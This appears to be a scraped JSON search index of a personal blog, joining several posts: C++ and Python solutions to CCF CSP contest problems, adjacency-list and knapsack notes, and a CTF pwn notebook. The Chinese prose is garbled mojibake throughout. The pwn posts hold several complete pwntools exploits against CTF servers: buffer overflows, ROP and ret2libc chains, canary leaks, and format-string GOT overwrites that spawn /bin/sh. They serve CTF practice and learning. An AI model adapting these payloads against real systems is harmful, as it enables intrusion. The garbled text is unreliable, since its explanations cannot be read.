dfs(u+1, sum + w[u]); } } int main(){ cin\u0026gt;\u0026gt;n\u0026gt;\u0026gt;x; for(int i = 0; i \u0026lt; n; i++){ cin\u0026gt;\u0026gt;w[i]; } dfs(0, 0); cout\u0026lt;\u0026lt;res\u0026lt;\u0026lt;endl; return 0; } åŠ¨æ€è§„åˆ’[[é—«æ°DPåˆ†ææ³•]] è¿™ä¸ªé¢˜æˆ‘ä»¬å¯ä»¥è½¬åŒ–ä¸º 01 èƒŒåŒ…é—®é¢˜ã€‚ 01 èƒŒåŒ…é—®é¢˜æ˜¯æ±‚è§£ä» n ä¸ªç‰©å“ä¸­é€‰æ‹©æŸå‡ ä¸ªç‰©å“ä½¿å¾—åœ¨ä¸è¶…è¿‡èƒŒåŒ…å®¹é‡ m çš„æƒ…å†µä¸‹è´¨é‡æœ€å¤§ã€‚ é‚£ä¹ˆè¿™ä¸ªé¢˜ï¼Œæ˜¯å¸Œæœ›é€‰å‡ æœ¬ä¹¦åœ¨å¯ä»¥åŒ…é‚®ï¼ˆä¹¦æœ¬ä»·æ ¼å¿…é¡»è¶…è¿‡ x ï¼‰çš„å‰æä¸‹ï¼Œå°½å¯èƒ½çš„ä»·æ ¼å°‘ã€‚ é‚£ä¹ˆè½¬åŒ–ä¸€ä¸‹ï¼Œé€‰å‡ æœ¬ä¹¦ï¼Œåœ¨ä»·å€¼ä¸è¶…è¿‡ sum-x çš„æƒ…å†µä¸‹ï¼Œæ€»ä»·æ ¼å°½å¯èƒ½çš„å¤šã€‚è¿™æ ·é€‰å‡ºæ¥çš„ä¹¦æœ¬æ˜¯è¦æ‰”çš„ï¼Œå‰©ä¸‹çš„å°±æ˜¯æ»¡è¶³ä¸Šè¿°è¦æ±‚ç•™ä¸‹æ¥çš„ä¹¦ã€‚ é‚£ä¹ˆèƒŒåŒ…å®¹é‡å°±æ˜¯ sum-xï¼Œç‰©å“è´¨é‡å’Œä½“ç§¯éƒ½æ˜¯ä¹¦æœ¬çš„ä»·æ ¼ï¼Œè¿™æ ·å°±å¯ä»¥ç›´æ¥å¥—æ¿å­äº†ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 #include\u0026lt;bits/stdc++.h\u0026gt; using namespace std; const int N = 33, M = 300010; int n, x; int w[N]; int f[M]; int main(){ cin\u0026gt;\u0026gt;n\u0026gt;\u0026gt;x; int sum = 0; for(int i = 0; i \u0026lt; n; i++){ cin\u0026gt;\u0026gt;w[i]; sum += w[i]; } int m = sum - x; for(int i = 0; i \u0026lt; n; i++){ for(int j = m; j \u0026gt;= w[i]; j-- ){ f[j] = max(f[j], f[j-w[i]]+w[i]); } } cout\u0026lt;\u0026lt;sum - f[m]\u0026lt;\u0026lt;endl; return 0; } ","permalink":"https://juhuax.github.io/posts/study/2.%E5%88%B7%E9%A2%98/%E7%AE%97%E6%B3%95/csp/%E7%AC%AC27%E6%AC%A1ccf%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%BD%AF%E4%BB%B6%E8%83%BD%E5%8A%9B%E8%AE%A4%E8%AF%81%E9%A2%98%E8%A7%A3/","summary":"å¦‚æ­¤ç¼–ç  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 #include\u0026lt;bits/stdc++.h\u0026gt; using namespace std; const int N = 25; int n,m; int a[N],c[N],b[N]; int main(){ cin\u0026gt;\u0026gt;n\u0026gt;\u0026gt;m; for(int i = 1; i \u0026lt;= n; i++) cin\u0026gt;\u0026gt;a[i]; c[0] = 1; c[1] = a[1]; for(int i = 2 ; i \u0026lt;= n; i++) c[i] = c[i-1] * a[i];","title":"ç¬¬27æ¬¡CCF-CSPè®¡ç®—æœºè½¯ä»¶èƒ½åŠ›è®¤è¯é¢˜è§£"},{"content":"ç§°æ£€æµ‹ç‚¹æŸ¥è¯¢ ç›´æ¥æ’åºé€‰æ‹©å‰ä¸‰å°±è¡Œ\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 #include \u0026lt;iostream\u0026gt; #include \u0026lt;cstring\u0026gt; #include \u0026lt;algorithm\u0026gt; using namespace std; const int N = 210; int n, X, Y; struct Point { int x, y, d; int id; bool operator\u0026lt; (const Point\u0026amp; t) const { if (d != t.d) return d \u0026lt; t.d; return id \u0026lt; t.id; } }q[N]; int get_dist(int x1, int y1, int x2, int y2) { int dx = x1 - x2; int dy = y1 - y2; return dx * dx + dy * dy; } int main() { cin \u0026gt;\u0026gt; n \u0026gt;\u0026gt; X \u0026gt;\u0026gt; Y; for (int i = 0; i \u0026lt; n; i ++ ) { int x, y; cin \u0026gt;\u0026gt; x \u0026gt;\u0026gt; y; q[i] = {x, y, get_dist(X, Y, x, y), i + 1}; } sort(q, q + n); for (int i = 0; i \u0026lt; 3; i ++ ) cout \u0026lt;\u0026lt; q[i].id \u0026lt;\u0026lt; endl; return 0; } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 import functools n, X, Y = map(int, input().split()) ans = [] for i in range(0, n): x, y = map(int, input().split()) dis = pow((x - X), 2) + pow((y - Y), 2) ans.append([i, dis, x, y]) ans.sort(key = lambda x : x[1]) for i in range(0, 3): print(ans[i][0] + 1) é£é™©äººç¾¤ç­›æŸ¥ æ³¨æ„é¢˜æ„ï¼Œé€—ç•™åŒ…æ‹¬ç»è¿‡ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 #include\u0026lt;bits/stdc++.h\u0026gt; using namespace std; int main(){ int n, k, t, xl, yl, xr, yr; cin\u0026gt;\u0026gt;n\u0026gt;\u0026gt;k\u0026gt;\u0026gt;t\u0026gt;\u0026gt;xl\u0026gt;\u0026gt;yl\u0026gt;\u0026gt;xr\u0026gt;\u0026gt;yr; int ans_d = 0, ans_j = 0; while(n--){ int x, y; int cnt_k = 0, cnt = 0; for(int i = 0; i \u0026lt; t; i++){ cin\u0026gt;\u0026gt;x\u0026gt;\u0026gt;y; if(x \u0026gt;= xl \u0026amp;\u0026amp; x \u0026lt;= xr \u0026amp;\u0026amp; y \u0026gt;= yl \u0026amp;\u0026amp; y \u0026lt;= yr){ cnt++; }else{ cnt_k = max(cnt_k, cnt); cnt = 0; } cnt_k = max(cnt_k, cnt); } if(cnt_k \u0026gt; 0 ) ans_j++; if(cnt_k \u0026gt;= k) ans_d++; } cout \u0026lt;\u0026lt; ans_j \u0026lt;\u0026lt;endl \u0026lt;\u0026lt; ans_d \u0026lt;\u0026lt;endl; } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 n, k, t, xl, yl, xr, yr = map(int, input().split()) ans_d = 0 ans_j = 0 for i in range(0, n): cnt_k = 0 cnt = 0 pos = list(map(int, input().split())) for j in range(0, t): x = pos[2 * j] y = pos[2 * j + 1] if x \u0026gt;= xl and x \u0026lt;= xr and y \u0026gt;= yl and y \u0026lt;= yr : cnt += 1 else: cnt_k = max(cnt_k, cnt) cnt = 0 cnt_k = max(cnt_k, cnt) if cnt_k \u0026gt; 0 : ans_j += 1 if cnt_k \u0026gt;= k : ans_d += 1 print(ans_j) print(ans_d) ","permalink":"https://juhuax.github.io/posts/study/2.%E5%88%B7%E9%A2%98/%E7%AE%97%E6%B3%95/csp/%E7%AC%AC%E4%BA%8C%E5%8D%81%E6%AC%A1ccf%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%BD%AF%E4%BB%B6%E8%83%BD%E5%8A%9B%E8%AE%A4%E8%AF%81%E9%A2%98%E8%A7%A3/","summary":"ç§°æ£€æµ‹ç‚¹æŸ¥è¯¢ ç›´æ¥æ’åºé€‰æ‹©å‰ä¸‰å°±è¡Œ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 #include \u0026lt;iostream\u0026gt; #include \u0026lt;cstring\u0026gt; #include \u0026lt;algorithm\u0026gt; using namespace std; const int N = 210;","title":"ç¬¬äºŒåæ¬¡CCFè®¡ç®—æœºè½¯ä»¶èƒ½åŠ›è®¤è¯é¢˜è§£"},{"content":"2022-8-28 get_started_3dsctf_2016 | LiuLian (liul14n.top)\n2022-8-27 [OGeek2019]babyrop1 æœ‰ä¸€äº›æœ¬åœ° libc å‡½æ•°çš„ç”¨æ³•ï¼Œå‚è€ƒä¸€ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 from pwn import * from LibcSearcher import * p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, 28820) elf=ELF(\u0026#39;./pwn1\u0026#39;) libc=ELF(\u0026#39;./libc-2.23.so\u0026#39;) system_libc=libc.symbols[\u0026#39;system\u0026#39;] binsh_libc=next(libc.search(b\u0026#39;/bin/sh\u0026#39;)) write_plt=elf.plt[\u0026#39;write\u0026#39;] write_got=elf.got[\u0026#39;write\u0026#39;] write_libc=libc.symbols[\u0026#39;write\u0026#39;] read_got=elf.got[\u0026#39;read\u0026#39;] read_plt=elf.plt[\u0026#39;read\u0026#39;] main_addr=0x8048825 #payload1-æˆªæ–­strlen payload1=b\u0026#39;\\x00\u0026#39;+b\u0026#39;\\xff\u0026#39;*7 p.sendline(payload1) p.recvuntil(\u0026#34;Correct\\n\u0026#34;) #pay;pad2 - æ³„éœ²readçš„gotåœ°å€ payload=b\u0026#39;a\u0026#39;*(0xe7+4)+p32(write_plt)+p32(main_addr) # ret1 ret2 payload+=p32(1)+p32(write_got)+p32(4) #write par1 par2 par3 #write_pltè¦†ç›–çš„æ˜¯sub_80487D0å‡½æ•°çš„è¿”å›åœ°å€ï¼Œè€Œwriteå‡½æ•°æ˜¯mainå‡½æ•°çš„å‡½æ•°ï¼Œæ‰€ä»¥åé¢éœ€è¦æœ‰ä¸‰ä¸ªwriteçš„å‚æ•° p.sendline(payload) write_addr=u32(p.recv(4)) print(\u0026#39;[+]write_addr: \u0026#39;, hex(write_addr))#å¾—åˆ°äº†writeåœ¨å†…å­˜ä¸­çš„ä½ç½® å¯ä»¥ç”¨é¢˜ç›®æä¾›çš„å‡½æ•°å…±äº«åº“ç®—å‡ºsystemåœ¨å†…å­˜ä¸­çš„ä½ç½® # libc=LibcSearcher(\u0026#39;read\u0026#39;, read_addr) # libc_base=read_addr-libc.dump(\u0026#39;read\u0026#39;) # system_addr=libc_base+libc.dump(\u0026#39;system\u0026#39;) # binsh_addr=libc_base+libc.dump(\u0026#39;str_bin_sh\u0026#39;) libc_base=write_addr-write_libc system_addr=system_libc+libc_base binsh_addr=binsh_libc+libc_base p.sendline(payload1) p.recvuntil(\u0026#34;Correct\\n\u0026#34;) payload=b\u0026#39;a\u0026#39;*(0xe7+4) payload+=p32(system_addr)+p32(main_addr)+p32(binsh_addr)#ç¬¬äºŒæ¬¡ç›´æ¥æŠŠè¿”å›åœ°å€æ”¹ä¸ºaddråœ°å€ p.sendline(payload) p.interactive() 2022-8-24 [ç¬¬äº”ç©ºé—´ 2019 å†³èµ›]PWN5 è¿™ä¸ªé¢˜æ˜¯éå¸¸å¥½çš„ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„é¢˜ å¯ä»¥æœ‰ä¸¤ä¸ªä¸ªæ€è·¯\nåˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´è¦†ç›–æŒ‡å®šå†…å­˜åœ°å€ é€šè¿‡ IDA å¯ä»¥å‘ç°è¯­å¥ read (fd, \u0026amp;dword_84c044, 4u)ï¼Œè¯´æ˜ dword_84c044 æ˜¯ä¸ª 4 ä¸ªå­—èŠ‚çš„å˜é‡ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦çš„ç›®æ ‡åœ°å€æ˜¯è¦†ç›–ä»¥ 0x0804c044 å¼€å¤´çš„ 4 ä¸ªå­—èŠ‚çš„å†…å­˜ã€‚ 1 2 3 4 5 6 7 8 9 10 from pwn import * p=remote(\u0026#39;node4.buuoj.cn\u0026#39;,28876) addr=0x0804C044 payload=p32(addr)+p32(addr+1)+p32(addr+2)+p32(addr+3) #æ„é€ è¦è¦†ç›–çš„åœ°å€ï¼Œ4ä¸ªå­—èŠ‚ï¼Œæ¯ä¸ªadd+næŒ‡å‘1ä¸ªå­—èŠ‚ payload+=\u0026#39;%10$hhn%11$hhn%12$hhn%13$hhn\u0026#39; #åˆ©ç”¨%n$hhnå¯¹ç¬¬nä¸ªå‚æ•°æŒ‡å‘çš„åœ°å€è¾“å…¥è¾“å…¥çš„å­—ç¬¦æ•°ï¼Œå¤§å°ä¸º1ä¸ªå­—èŠ‚ # payload = fmtstr_payload(10,{addr:0x10101010}) p.sendline(payload) payload=str(0x10101010)#å› ä¸ºè¾“å…¥çš„å­—ç¬¦æ ‘æ˜¯16ï¼Œæ‰€ä»¥æ¯ä¸ªå­—èŠ‚æ˜¯0x10 p.sendline(payload) p.interactive() åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ”¹å†™ atoi çš„ got åœ°å€ï¼Œå°†å…¶æ”¹ä¸º system çš„åœ°å€ï¼Œé…åˆä¹‹åçš„è¾“å…¥ï¼Œå¾—*åˆ° shellã€‚è¿™ç§æ–¹æ³•å…·æœ‰æ™®éæ€§ï¼Œä¹Ÿå¯ä»¥æ”¹å†™åé¢çš„å‡½æ•°çš„åœ°å€ï¼Œæ‹¿åˆ° shellã€‚ 1 2 3 4 5 6 7 8 9 from pwn import * p = process(\u0026#39;./pwn5\u0026#39;) elf = ELF(\u0026#39;./pwn5\u0026#39;) atoi_got = elf.got[\u0026#39;atoi\u0026#39;] system_plt = elf.plt[\u0026#39;system\u0026#39;] payload=fmtstr_payload(10,{atoi_got:system_plt}) p.sendline(payload) p.sendline(\u0026#39;/bin/sh\\x00\u0026#39;) p.interactive() 2022-4-26 [NISACTF 2022]ezstack\nè¿™æ˜¯ä¸ª 32 ä½ç¨‹åºï¼Œä¸ç”¨æ‰¾ pop rdi ç»™ system ä¼ å‚ 1 2 3 4 5 6 7 8 9 from pwn import * elf = ELF(\u0026#34;./pwn\u0026#34;) p = remote(\u0026#34;1.14.71.254\u0026#34;, 28783) system = elf.plt[\u0026#34;system\u0026#34;] binsh = 0x0804A024 payload = b\u0026#39;a\u0026#39; * 76 + p32(system) + p32(0xabcdabcd) + p32(binsh) p.sendlineafter(\u0026#34;Welcome to NISACTF\\n\u0026#34;, payload) p.interactive() [GFCTF 2021]where_is_shell\nå› ä¸ºä¸€èˆ¬åœ¨ linux ä¸­â€™$0â€™è¢«ç”¨äº bash çš„ç¯å¢ƒå˜é‡ï¼Œä¹Ÿå°±æ˜¯è¯´ system(\u0026quot;$0\u0026quot;) == system('bin/sh') tips å‡½æ•°æœ¬èº«æ˜¯æ²¡ç”¨çš„ï¼Œä½†æ˜¯ tips å‡½æ•°çš„ä½ç½®ä½äº 0x400537 åˆ° 0x400547 ä¹‹é—´ï¼Œæˆ‘ä»¬å»çœ‹è¿™éƒ¨åˆ†çš„åå…­è¿›åˆ¶ï¼Œå‘ç°äº†ä½äº 0x400541 çš„ 0x2430 ä¹Ÿå°±æ˜¯$0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 from pwn import * #p = process(\u0026#34;gfshell\u0026#34;) p = remote(\u0026#34;1.14.71.254\u0026#34;,28056) elf = ELF(\u0026#34;gfshell\u0026#34;) system = elf.plt[\u0026#39;system\u0026#39;] tips = 0x400541 ret = 0x400416 pop_rdi = 0x4005e3 payload = b\u0026#39;a\u0026#39;*0x10+p64(0)+p64(ret)+p64(pop_rdi)+p64(tips)+p64(system) p.recvuntil(\u0026#34;it?\u0026#34;) p.sendline(payload) p.interactive() 2022-4-25 [CISCN 2019 ä¸œåŒ—]PWN2\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 1 from pwn import * 2 from LibcSearcher import * 3 4 5 p = remote(\u0026#34;1.14.71.254\u0026#34;, 28285) 6 elf = ELF(\u0026#34;./pwn\u0026#34;) 7 main = elf.sym[\u0026#34;main\u0026#34;] 8 puts_plt = elf.plt[\u0026#34;puts\u0026#34;] 9 puts_got = elf.got[\u0026#34;puts\u0026#34;] 10 pop_rdi = 0x400c83 11 ret = 0x4006b9 12 13 payload = b\u0026#34;a\u0026#34;*88 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main) 14 p.sendlineafter(\u0026#34;Input your choice!\\n\u0026#34;, \u0026#34;1\u0026#34;) 15 p.recvuntil(\u0026#34;Input your Plaintext to be encrypted\\n\u0026#34;) 16 p.sendline(payload) #ä¸ç”¨ç†ä¼šåŠ å¯†ï¼Œå› ä¸ºåªä¼šåŠ å¯†48ä¸ªå­—èŠ‚ï¼Œä¸ä¼šå¯¹æˆ‘ä»¬è¦ç”¨åˆ°çš„å­—æ®µåŠ å¯† 17 puts_addr = u64(p.recvuntil(\u0026#34;\\x7f\u0026#34;)[-6:].ljust(8,b\u0026#39;\\x00\u0026#39;)) 18 libc = LibcSearcher(\u0026#34;puts\u0026#34;, puts_addr) 19 libc_base = puts_addr - libc.dump(\u0026#34;puts\u0026#34;) 20 system = libc_base + libc.dump(\u0026#34;system\u0026#34;) 21 bin_sh = libc_base + libc.dump(\u0026#34;str_bin_sh\u0026#34;) 22 payload = b\u0026#34;a\u0026#34;*88 + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(system) 23 p.recvuntil(\u0026#34;Input your choice!\\n\u0026#34;) 24 p.sendline(\u0026#34;1\u0026#34;) 25 p.recvuntil(\u0026#34;Input your Plaintext to be encrypted\\n\u0026#34;) 26 p.sendline(payload) 27 p.interactive() 2022-4-24 [NISACTF 2022]ReorPwn?\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 __int64 __fastcall fun(const char *a1) { __int64 result; // rax char v2; // [rsp+17h] [rbp-9h] int i; // [rsp+18h] [rbp-8h] int v4; // [rsp+1Ch] [rbp-4h] v4 = strlen(a1); //è¾“å…¥å­—ç¬¦ä¸²é•¿åº¦ for ( i = 0; ; ++i ) //äº¤æ¢å‰åä¸¤æ®µå­—ç¬¦ { result = (unsigned int)(v4 / 2); //ä¸­é—´é‚£ä¸ªæ•° if ( i \u0026gt;= (int)result ) break; v2 = a1[i]; //v2ä¾æ¬¡ç­‰äºå‰åŠæ®µå­—ç¬¦ a1[i] = a1[v4 - i - 1]; a1[v4 - i - 1] = v2; } return result; } /bin/sh 7ä¸ªå­—ç¬¦ hs/nib/ from pwn import * p=remote(\u0026#39;1.14.71.254\u0026#39;,28321) payload = \u0026#34;hs/nib/\u0026#34; p.sendlineafter(\u0026#34;:\u0026#34;,payload) p.interactive() [BJDCTF 2020]babystack2.0\n1 2 3 4 5 6 7 8 9 10 11 from pwn import * elf = ELF(\u0026#39;ret2text\u0026#39;) p=remote(\u0026#39;1.14.71.254\u0026#39;,28098) backdoor = elf.symbols[\u0026#39;backdoor\u0026#39;] p.sendlineafter(\u0026#34;name:\u0026#34;,\u0026#39;-1\u0026#39;) #-1èº²è¿‡æ£€æŸ¥ payload = b\u0026#39;a\u0026#39; * 24 + p64(backdoor) p.sendlineafter(\u0026#34;name?\u0026#34;,payload) p.interactive() [BJDCTF 2020]babystack\n1 2 3 4 5 6 7 8 9 10 11 from pwn import * elf = ELF(\u0026#39;ret2text\u0026#39;) p=remote(\u0026#39;1.14.71.254\u0026#39;,28098) backdoor = elf.symbols[\u0026#39;backdoor\u0026#39;] p.sendline(\u0026#39;100\u0026#39;) #è¿™ä¸ª100æ˜¯å› ä¸ºæºç æŒ‰ä½ è¾“å…¥çš„é•¿åº¦è¯»å–çš„ï¼Œpayloadé•¿24+ï¼Œ100é•¿åº¦è¶³å¤Ÿ payload = b\u0026#39;a\u0026#39; * 24 + p64(backdoor) p.sendline(payload) p.interactive() littleof NSSCTF\nROPgadget --binary babyof --only \u0026quot;pop|retâ€\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 from pwn import * from LibcSearcher import * #io = process(\u0026#39;./littleof\u0026#39;) io = remote(\u0026#39;1.14.71.254\u0026#39;, 28001) elf = ELF(\u0026#39;./littleof\u0026#39;) put_plt = elf.plt[\u0026#39;puts\u0026#39;] put_got = elf.got[\u0026#39;puts\u0026#39;] pop_rdi_ret = 0x0000000000400863 ret = 0x000000000040059e main = 0x0000000000400789 payload = b\u0026#39;a\u0026#39; * (0x50 - 0x8) io.recvuntil(\u0026#34;Do you know how to do buffer overflow?\u0026#34;) io.sendline(payload) io.recvuntil(\u0026#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\n\u0026#34;) canary = u64(io.recv(7).rjust(8, b\u0026#39;\\x00\u0026#39;)) print(\u0026#34;canary:\u0026#34;,hex(canary)) payload1 = b\u0026#39;a\u0026#39; * (0x50 - 0x8) + p64(canary) + b\u0026#39;a\u0026#39; * 0x8 + p64(pop_rdi_ret) + p64(put_got) + p64(put_plt) + p64(main) io.sendlineafter(\u0026#34;Try harder!\u0026#34;, payload1) puts_addr = u64(io.recvuntil(\u0026#34;\\x7f\u0026#34;)[-6:].ljust(8,b\u0026#39;\\x00\u0026#39;)) libc = LibcSearcher(\u0026#39;puts\u0026#39;, puts_addr) libc_base = puts_addr - libc.dump(\u0026#39;puts\u0026#39;) system = libc_base + libc.dump(\u0026#39;system\u0026#39;) bin_sh = libc_base + libc.dump(\u0026#39;str_bin_sh\u0026#39;) payload = b\u0026#39;a\u0026#39; * (0x50 - 0x8) io.recvuntil(\u0026#34;Do you know how to do buffer overflow?\u0026#34;) io.sendline(payload) io.recvuntil(\u0026#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\n\u0026#34;) canary = u64(io.recv(7).rjust(8, b\u0026#39;\\x00\u0026#39;)) payload2 = b\u0026#39;a\u0026#39; * (0x50 - 0x8) + p64(canary) + b\u0026#39;a\u0026#39; * 0x8 + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh) + p64(system) io.sendlineafter(\u0026#34;Try harder!\u0026#34;, payload2) io.interactive() [CISCN 2019 ååŒ—]PWN1 [NSSCTF - [CISCN 2019 ååŒ—]PWN1 (ctfer. vip)]( https://www.ctfer.vip/#/problem/100?back=%257B%2522contest%2522:%2522%2522 ,%2522year%25 22:0,%2522source%25 22:0,%2522name%2522:%2522%2522,%2522username%2522:%2522%2522,%2522type%25 22:2,%2522tag%2522:%255B%255D,%2522tagType%25 22:0,%2522date%2522:%2522%2522,%2522unsolved%2522: false,%2522page%25 22:1 %257D)\nåœ¨çº¿è¿›åˆ¶è½¬æ¢-IEE754æµ®ç‚¹æ•°16è¿›åˆ¶è½¬æ¢ (lostphp.com)\n1 2 3 4 5 from pwn import * pro = remote(\u0026#39;1.14.71.254\u0026#39;,28091) payload = b\u0026#39;a\u0026#39;*44+p32(0x41348000) pro.sendlineafter(\u0026#39;number.\u0026#39;,payload) print(pro.recvall()) ","permalink":"https://juhuax.github.io/posts/study/2.%E5%88%B7%E9%A2%98/ctf/pwn/%E7%AE%80%E5%8D%95%E9%A2%98%E6%97%A7/","summary":"2022-8-28 get_started_3dsctf_2016 | LiuLian (liul14n.top) 2022-8-27 [OGeek2019]babyrop1 æœ‰ä¸€äº›æœ¬åœ° libc å‡½æ•°çš„ç”¨æ³•ï¼Œå‚è€ƒä¸€ä¸‹ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47","title":"ç®€å•é¢˜(æ—§)"},{"content":"æ¨¡æ¿ä»£ç  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 int idxï¼› int h[N], e[N], ne[N], w[N;] // æ³¨æ„è¿™é‡Œè¦åˆå§‹åŒ– head ä¸º -1 memset(h, 0xff, sizeof(h)); // åŠ å…¥æœ‰å‘è¾¹ (x, y)ï¼Œæƒå€¼ä¸º z void add(int x, int y, int z) { // çœŸå®æ•°æ® e[idx] = y, w[idx] = z; // åœ¨è¡¨å¤´ x å¤„æ’å…¥ ne[idx] = h[x], h[x] = idx++; } // è®¿é—®ä» x å‡ºå‘çš„æ‰€æœ‰è¾¹ï¼Œæ³¨æ„è¿™é‡Œç»ˆæ­¢æ¡ä»¶çš„ä¸åŒ for (int i = h[x]; ~i; i = ne[i]) {//~iè¡¨ç¤ºiä¸ç­‰äº-1 int y = e[i], z = w[i]; } é‚»æ¥è¡¨æ„æˆçš„æ•°æ®ç»“æ„å›¾ç¤º æ³¨æ„è¿™é‡Œæœ‰ä¸ªå®¹æ˜“ææ··çš„ç‚¹ï¼Œæ¯æ¡é“¾è¡¨ä¸ŠæŒ‚çš„æ˜¯ä»å¯¹åº”å¤´ç»“ç‚¹çš„æ‰€æœ‰å‡ºè¾¹ï¼Œè€Œä¸æ˜¯å›¾ä¸­çš„ä¸€æ¡è·¯å¾„ã€‚\nå‚è€ƒ é‚»æ¥è¡¨ä»£ç  é‚»æ¥è¡¨è§£é‡Š yæ€»æ•°æ®ç»“æ„ç¬”è®°ä¸€\n","permalink":"https://juhuax.github.io/posts/study/2.%E5%88%B7%E9%A2%98/%E7%AE%97%E6%B3%95/%E9%82%BB%E6%8E%A5%E8%A1%A8/","summary":"æ¨¡æ¿ä»£ç  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 int idxï¼› int h[N], e[N], ne[N], w[N;] // æ³¨æ„è¿™é‡Œè¦åˆå§‹åŒ– head ä¸º -1 memset(h, 0xff, sizeof(h)); // åŠ å…¥æœ‰å‘è¾¹ (x, y)ï¼Œæƒå€¼ä¸º z void add(int x, int y, int z) { // çœŸå®æ•°","title":"é‚»æ¥è¡¨"},{"content":"é¢˜å¹²ï¼šN ä¸ªç‰©å“ï¼Œæ¯ä¸ªç‰©å“æœ‰å¯¹åº”çš„ä»·å€¼å’Œä½“ç§¯ï¼ŒèƒŒåŒ…å®¹é‡ä¸º Vï¼Œå¦‚ä½•é€‰æ‹©ç‰©å“ä½¿å¾—åœ¨ä¸è¶…è¿‡èƒŒåŒ…å®¹é‡çš„å‰æä¸‹ï¼Œä»·å€¼ä¹‹å’Œæœ€å¤§ã€‚ æ¯ä¸ªç‰©å“éƒ½å¯ä»¥é€‰å’Œä¸é€‰ï¼Œä¸¤ç§é€‰æ‹©ï¼Œé‚£ä¹ˆä¸€å…±æœ‰ $2^N$ ä¸¤ç§æ–¹æ¡ˆï¼Œæ‰€ä»¥é¢˜ç›®æ˜¯ä¸€ä¸ªæœ‰é™é›†åˆçš„æœ€å€¼é—®é¢˜ï¼Œæ‰€ä»¥å¯ä»¥ç”¨ y æ° DP æ³•æ¥åˆ†æ\næ­¥éª¤ä¸€ï¼šçŠ¶æ€è¡¨ç¤º $f(i,j)$\nç¡®å®šé›†åˆï¼šï¼ˆi å’Œ j è¡¨ç¤ºçš„æ„æ€ï¼‰åœ¨åªè€ƒè™‘å‰ i ä¸ªç‰©å“ï¼Œå¹¶ä¸”ç‰©å“æ€»ä½“ç§¯ä¸è¶…è¿‡ j çš„é€‰æ³•çš„é›†åˆ å±æ€§ï¼šï¼ˆ$f(i,j)$ çš„å€¼ä»£è¡¨çš„æ„æ€ï¼Œå’Œé¢˜æ„ç›¸å…³ï¼‰å½“å‰é›†åˆä¸­çš„æœ€å¤§ä»·å€¼ æ­¥éª¤äºŒï¼šçŠ¶æ€è®¡ç®— é‚£ä¹ˆ $f(i,j)$ å¦‚ä½•è®¡ç®—å‘¢ï¼Œå¯¹äºä¸Šè¿°çš„é›†åˆï¼Œæˆ‘ä»¬å¯ä»¥åˆ†ä¸ºä¸¤ä¸ªå­é›† ä¸€ä¸ªå­é›†æ˜¯æ²¡æœ‰é€‰æ‹©ç‰©å“ i çš„é›†åˆ å¦‚æœä¸é€‰æ‹©ç‰©å“ iï¼Œé‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦æ‰¾åˆ°åªè€ƒè™‘å‰ $i-1$ ä¸ªç‰©å“ï¼Œå¹¶ä¸”ç‰©å“æ€»ä½“ç§¯ä¸è¶…è¿‡ j çš„é€‰æ³•é›†åˆä¸­çš„æœ€å¤§ä»·å€¼ï¼Œä¹Ÿå°±æ˜¯ $f(i-1,j)$ ä¸€ä¸ªå­é›†æ˜¯é€‰æ‹©äº†ç‰©å“ i çš„é›†åˆ å¦‚æœé€‰æ‹©äº†ç‰©å“ iï¼Œé‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦æ‰¾åˆ°åªè€ƒè™‘å‰ $i-1$ ä¸ªç‰©å“ï¼Œå¹¶ä¸”ç‰©å“æ€»ä½“ç§¯ä¸è¶…è¿‡ $j-v[i]$ çš„é€‰æ³•é›†åˆä¸­çš„æœ€å¤§ä»·å€¼ï¼Œä¹Ÿå°±æ˜¯ $f(i-1,j-v[i])$ ç„¶ååŠ ä¸Šç‰©å“ i çš„ä»·å€¼ $w [i]$ $f(i-1,j-v[i])+w[i]$ æ³¨æ„ j å’Œ v[i]çš„å¤§å° æ¿å­ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 #include\u0026lt;iostream\u0026gt; #include\u0026lt;algorithm\u0026gt; using namespace std; const int N=1005; 